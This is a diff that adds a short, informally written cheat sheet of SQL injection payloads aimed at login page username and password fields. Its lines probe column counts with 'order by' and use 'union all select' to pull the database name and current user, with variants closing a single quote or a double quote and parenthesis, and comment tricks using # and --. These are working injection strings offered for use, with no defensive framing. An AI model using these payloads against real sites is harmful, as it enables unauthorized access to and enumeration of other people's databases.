@@ -1,0 +1,17 @@
+it use in login page id and password 
++ //it do not use in post based
+you can use # insted of --
+
+\ :- to know the endinf part
+'order by 2#
+' union all select 1,2#
+'union all select database(),user()#
+done---
+
+\
+") order by 2#
+") union all select 1,2#
+") union all select database(),user()#
+done--
+
+
